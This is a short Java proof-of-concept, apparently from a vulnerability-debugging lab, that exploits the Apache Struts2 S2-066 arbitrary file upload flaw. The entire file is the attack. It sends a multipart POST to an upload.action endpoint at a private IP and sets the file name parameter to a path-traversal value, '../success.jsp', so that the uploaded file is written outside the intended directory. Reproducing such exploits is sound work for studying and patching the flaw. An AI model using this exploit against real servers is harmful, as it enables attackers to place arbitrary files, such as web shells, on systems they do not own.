package struts2.cve;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ContentType;
import org.apache.http.entity.mime.MultipartEntityBuilder;
import org.apache.http.entity.mime.content.FileBody;

import java.io.File;
import java.io.IOException;

/**
 * Apache Struts2 任意文件上传漏洞(S2-066)
 * 启动Struts2模块的web应用测试
 */
public class S2_066 {

    public static void main(String[] args) throws IOException {

        String url = "http://10.58.120.200:8080/S2-066/upload.action?uploadFileName=";
        // NOTE 上传目标路径
        String params = "../success.jsp";
        // TODO 替换为本地文件路径
        String filepath = "D:\\tmp\\1.txt";
        File file = new File(filepath);
        String fileName = file.getName();
        HttpRequest httpRequest = new HttpRequest("127.0.0.1", 8080);
        HttpClient httpClient = httpRequest.getHttpClient();
        HttpPost httpPost = new HttpPost(url + params);
        MultipartEntityBuilder multipartEntityBuilder = MultipartEntityBuilder.create()
                .addPart("Upload", new FileBody(file, ContentType.APPLICATION_OCTET_STREAM, fileName));
        HttpEntity multipartEntity = multipartEntityBuilder.build();
        httpPost.setEntity(multipartEntity);
        HttpResponse response = httpClient.execute(httpPost);
        System.out.println(response.getStatusLine().getStatusCode());
    }
}
